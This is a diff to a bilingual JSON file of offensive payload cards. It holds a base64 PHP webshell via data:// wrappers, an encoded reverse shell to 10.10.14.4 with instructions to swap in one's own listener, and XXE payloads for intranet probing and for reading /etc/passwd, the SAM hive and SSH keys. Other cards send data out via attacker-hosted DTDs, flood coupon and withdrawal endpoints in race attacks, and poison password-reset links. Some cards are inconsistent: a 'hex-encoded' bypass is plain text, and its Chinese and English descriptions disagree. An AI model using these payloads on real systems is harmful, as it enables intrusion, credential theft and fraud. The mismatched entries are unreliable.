+     "expectedCommand": "php://filter/convert.base64-decode/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==",
+     "title": {
+      "zh": "filter 链解码执行代码",
+      "en": "Fix the data:// media type and run a system command"
+     }
+    }
+   ]
+  },
+  {
+   "id": "rce-cmd-blind",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "; echo \"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==\" | base64 -d | bash",
+     "description": {
+      "zh": "将反弹 Shell 命令 Base64 编码后经 echo|base64 -d|bash 解码执行，验证绕过对明文反弹命令关键字的过滤。复制后需将 Base64 解码内容中的回连 IP 与端口改为自有监听地址并重新编码。命中判据：过滤器放行该请求且监听器收到反弹连接。",
+      "en": "Base64-encodes a reverse-shell command and runs it through echo|base64 -d|bash to bypass plaintext-keyword filtering. After copying, change the callback IP and port inside the Base64-decoded content to your own listener and re-encode. Success check: the filter lets the request pass and the listener receives the reverse connection."
+     }
+    }
+   ]
+  },
+  {
+   "id": "rce-image",
+   "patches": [
+    {
+     "area": "execution",
+     "index": 2,
+     "expectedCommand": "?file=upload/shell.jpg\nPOST: cmd=system('whoami');\n?file=phar://upload/shell.jpg",
+     "description": {
+      "zh": "判据: 经文件包含参数包含已上传的 shell.jpg 执行内嵌 PHP 代码；phar:// 行仅在 shell.jpg 同时为含 __HALT_COMPILER() 存根与恶意元数据的 phar 多态文件时触发元数据反序列化（构造方式见 PHP 反序列化卡片）。命中判据：包含 shell.jpg 后传入 cmd=system('whoami'); 返回当前用户名。",
+      "en": "Reach the uploaded shell.jpg through an inclusion parameter and the phar:// stream, verifying embedded PHP code or metadata executes on inclusion or parsing. Success check: including shell.jpg with cmd=whoami returns the current username."
+     }
+    }
+   ]
+  },
+  {
+   "id": "xxe-ssrf",
+   "patches": [
+    {
+     "area": "execution",
+     "index": 0,
+     "expectedCommand": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"http://192.168.1.1:22\">\n]>\n<foo>&xxe;</foo>\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"http://192.168.1.1:80\">\n]>\n<foo>&xxe;</foo>\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"http://192.168.1.1:443\">\n]>\n<foo>&xxe;</foo>",
+     "description": {
+      "zh": "对 192.168.1.1 的 22、80、443 端口各生成一个独立完整 XML 样例并逐个提交；以响应时间与错误差异区分端口连通性，某端口响应特征不同即确认解析器可达该内网端口。",
+      "en": "Generate one independent XML sample per port (22/80/443) on 192.168.1.1 and submit them one at a time; response-time and error differences distinguish reachability, and a distinctive response on a port confirms the parser reaches that intranet port."
+     },
+     "title": {
+      "zh": "内网端口逐一探测（22/80/443）",
+      "en": "Per-port intranet probing (22/80/443)"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 1,
+     "expectedCommand": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"http://127.0.0.1:6379/info\">\n]>\n<foo>&xxe;</foo>",
+     "title": {
+      "zh": "本机 Redis 端点探测",
+      "en": "Local Redis endpoint probe"
+     }
+    }
+   ]
+  },
+  {
+   "id": "xxe-file-read",
+   "patches": [
+    {
+     "area": "execution",
+     "index": 1,
+     "expectedCommand": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">\n]>\n<foo>&xxe;</foo>",
+     "description": {
+      "zh": "用内部实体读取 win.ini 验证 Windows 文件读取；回显出现 win.ini 内容即确认读取成功。其余可选目标：file:///c:/windows/system32/config/sam、file:///c:/users/administrator/.ssh/id_rsa。",
+      "en": "Read win.ini via an internal entity to confirm Windows file read; win.ini content in the response confirms success. Other candidate targets: file:///c:/windows/system32/config/sam, file:///c:/users/administrator/.ssh/id_rsa."
+     },
+     "title": {
+      "zh": "读取 Windows win.ini",
+      "en": "Read Windows win.ini"
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 5,
+     "expectedCommand": "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><x>&x;</x>",
+     "title": {
+      "zh": "路径点号混淆变体",
+      "en": "Hex-Entity Encoded Path"
+     },
+     "description": {
+      "zh": "在路径中插入 /./ 层级段混淆明文特征，规避 file:///etc/passwd 固定字符串匹配；成功判据：文件内容仍被读取回显。",
+      "en": "Encodes path characters as numeric entities to evade the plaintext file:///etc/passwd rule. Success: the entity resolves via the encoded path."
+     },
+     "command": "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><x>&x;</x>"
+    },
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "<?xml version=\"1.0\"?> \n <!DOCTYPE foo [ \n <!ENTITY % dtd SYSTEM \"http://{LAB_OAST}/read.dtd\"> \n %dtd; \n ]> \n <foo>&bar;</foo>",
+     "command": "<?xml version=\"1.0\"?> \n <!DOCTYPE foo [ \n <!ENTITY % dtd SYSTEM \"http://{LAB_OAST}/read.dtd\"> \n %dtd; \n ]> \n <foo>&bar;</foo>"
+    }
+   ]
+  },
+  {
+   "id": "xxe-dtd",
+   "patches": [
+    {
+     "area": "execution",
+     "index": 2,
+     "expectedCommand": "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % start \"<![CDATA[\">\n<!ENTITY % end \"]]>\">\n<!ENTITY % all \"%start;%file;%end;\">",
+     "title": {
+      "zh": "CDATA 包裹参数实体块",
+      "en": "CDATA-wrapped parameter entity block"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 3,
+     "expectedCommand": "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">\n%eval;\n%error;",
+     "title": {
+      "zh": "报错式参数实体外带块",
+      "en": "Error-based parameter entity block"
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 6,
+     "expectedCommand": "<?xml version=\"1.0\"?> \n <!DOCTYPE data [ \n <!ENTITY % dtd SYSTEM \"http://{LAB_OAST}/cdata.dtd\"> \n %dtd; \n ]> \n <data>&send;</data>",
+     "description": {
+      "zh": "CDATA 转义写法变体 — CDATA 括号以 &#91;/&#93; 字符实体书写，规避对 <![CDATA[ 明文的检测；本块置于外部 DTD 托管，%all; 构造出以 CDATA 包裹文件内容的通用实体 fileContents，正文引用即完整展开；成功判据：解析输出出现 CDATA 包裹的完整 Base64 文件内容。",
+      "en": "Writes CDATA brackets as character references to evade detection of the literal <![CDATA[. Success: the send entity is constructed and OAST is requested."
+     },
+     "command": "<?xml version=\"1.0\"?> \n <!DOCTYPE data [ \n <!ENTITY % dtd SYSTEM \"http://{LAB_OAST}/cdata.dtd\"> \n %dtd; \n ]> \n <data>&send;</data>"
+    },
+    {
+     "area": "wafBypass",
+     "index": 2,
+     "expectedCommand": "<?xml version=\"1.0\"?> \n <!DOCTYPE foo [ \n <!ENTITY % dtd SYSTEM \"http://{LAB_OAST}/err.dtd\"> \n %dtd; \n ]> \n <foo>test</foo>",
+     "command": "<?xml version=\"1.0\"?> \n <!DOCTYPE foo [ \n <!ENTITY % dtd SYSTEM \"http://{LAB_OAST}/err.dtd\"> \n %dtd; \n ]> \n <foo>test</foo>"
+    },
+    {
+     "area": "wafBypass",
+     "index": 3,
+     "expectedCommand": "<?xml version=\"1.0\"?> \n <!DOCTYPE foo [ \n <!ENTITY % dtd SYSTEM \"http://{LAB_OAST}/e.dtd\"> %dtd; \n ]> \n <foo>test</foo>",
+     "command": "<?xml version=\"1.0\"?> \n <!DOCTYPE foo [ \n <!ENTITY % dtd SYSTEM \"http://{LAB_OAST}/e.dtd\"> %dtd; \n ]> \n <foo>test</foo>"
+    },
+    {
+     "area": "wafBypass",
+     "index": 4,
+     "expectedCommand": "<?xml version=\"1.0\"?> \n <!DOCTYPE data [ \n <!ENTITY % dtd SYSTEM \"http://{LAB_OAST}/error.dtd\"> \n %dtd; \n ]> \n <data>test</data>",
+     "command": "<?xml version=\"1.0\"?> \n <!DOCTYPE data [ \n <!ENTITY % dtd SYSTEM \"http://{LAB_OAST}/error.dtd\"> \n %dtd; \n ]> \n <data>test</data>"
+    },
+    {
+     "area": "wafBypass",
+     "index": 8,
+     "expectedCommand": "<?xml version=\"1.0\"?> \n <!DOCTYPE data [ \n <!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource={FILE_PATH}\"> \n <!ENTITY % dtd SYSTEM \"http://{LAB_OAST}/cdata.dtd\"> \n %dtd; \n ]> \n <data>&send;</data>",
+     "command": "<?xml version=\"1.0\"?> \n <!DOCTYPE data [ \n <!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource={FILE_PATH}\"> \n <!ENTITY % dtd SYSTEM \"http://{LAB_OAST}/cdata.dtd\"> \n %dtd; \n ]> \n <data>&send;</data>"
+    }
+   ]
+  },
+  {
+   "id": "biz-race-condition",
+   "patches": [
+    {
+     "area": "execution",
+     "index": 0,
+     "expectedCommand": "# 典型竞态场景：\n# 1. 优惠券领取 POST /api/coupon/claim\n# 2. 余额提现 POST /api/withdraw\n# 3. 积分兑换 POST /api/points/exchange\n# 4. 限量商品抢购 POST /api/order/create\n# 5. 投票/点赞 POST /api/vote",
+     "description": {
+      "zh": "从领取、提现、兑换、抢购、投票等典型场景中锁定一个状态递减端点；取得该端点的正常响应与资源数量基线，即完成竞态目标识别。",
+      "en": "Lock onto one state-decreasing endpoint among claim, withdrawal, exchange, purchase, and voting scenarios; capturing its normal response and resource-count baseline completes race-target identification."
+     },
+     "title": {
+      "zh": "识别竞态目标",
+      "en": "Identify race condition target"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 2,
+     "expectedCommand": "def queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint,\n                           concurrentConnections=30,\n                           requestsPerConnection=100,\n                           pipeline=True)\n    for i in range(50):\n        engine.queue(target.req, gate=\"race1\")\n    engine.openGate(\"race1\")\n\ndef handleResponse(req, interesting):\n    if \"success\" in req.response:\n        table.add(req)",
+     "description": {
+      "zh": "以 Turbo Intruder gate 同步释放 50 个请求；多个请求同时命中 success 或资源被多次扣减，即确认并发原子性缺失。",
+      "en": "Release 50 requests simultaneously via the Turbo Intruder gate; multiple successes or repeated resource deduction confirms missing concurrency atomicity."
+     },
+     "title": {
+      "zh": "Burp Turbo Intruder测试",
+      "en": "Burp Turbo Intruder Test"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 1,
+     "expectedCommand": "import asyncio\nimport aiohttp\n\nasync def race_request(session, url, headers, data):\n    async with session.post(url, headers=headers, json=data) as resp:\n        return await resp.json()\n\nasync def main():\n    url = \"https://{TARGET}/api/coupon/claim\"\n    headers = {\"Authorization\": \"Bearer {TOKEN}\"}\n    data = {\"coupon_id\": \"COUPON001\"}\n    async with aiohttp.ClientSession() as session:\n        tasks = [race_request(session, url, headers, data) for _ in range(50)]\n        results = await asyncio.gather(*tasks)\n        success = sum(1 for r in results if r.get(\"code\") == 200)\n        print(f\"Total: {len(results)}, Success: {success}\")\n\nasyncio.run(main())",
+     "title": {
+      "zh": "Python并发测试脚本",
+      "en": "Pythonconcurrent Test Script"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 3,
+     "expectedCommand": "GET /api/user/coupons HTTP/1.1",
+     "command": "GET /api/user/coupons HTTP/1.1"
+    },
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "urls=\"\"; for i in $(seq 1 50); do urls=\"$urls https://{TARGET}/api/coupon/claim\"; done",
+     "command": "urls=\"\"; for i in $(seq 1 50); do urls=\"$urls https://{TARGET}/api/coupon/claim\"; done"
+    }
+   ]
+  },
+  {
+   "id": "biz-password-reset",
+   "patches": [
+    {
+     "area": "execution",
+     "index": 2,
+     "expectedCommand": "# 原始失败响应\n{\"code\": 400, \"message\": \"验证码错误\"}\n\n# 拦截并修改为成功\n{\"code\": 200, \"message\": \"验证成功\", \"token\": \"reset_token_here\"}\n\n# 某些前端仅检查code字段就放行后续操作",
+     "title": {
+      "zh": "响应操纵绕过",
+      "en": "Response manipulation bypass"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 0,
+     "expectedCommand": "POST /api/password/reset HTTP/1.1\nHost: {ATTACKER_HOST}\nX-Forwarded-Host: {ATTACKER_HOST}\nContent-Type: application/json\n{\"email\": \"victim@{TARGET}\"}\n# https://{ATTACKER_HOST}/reset?token=abc123",
+     "description": {
+      "zh": "向密码重置接口同时把 Host 与 X-Forwarded-Host 伪造成 {ATTACKER_HOST}；生成的重置链接指向 {ATTACKER_HOST} 即确认链接域名取自请求头。",
+      "en": "Injects X-Forwarded-Host: evil-server.com into the password-reset request to see whether the generated reset link points at the attacker's domain."
+     }
+    }
+   ]
+  }
+ ]
 }
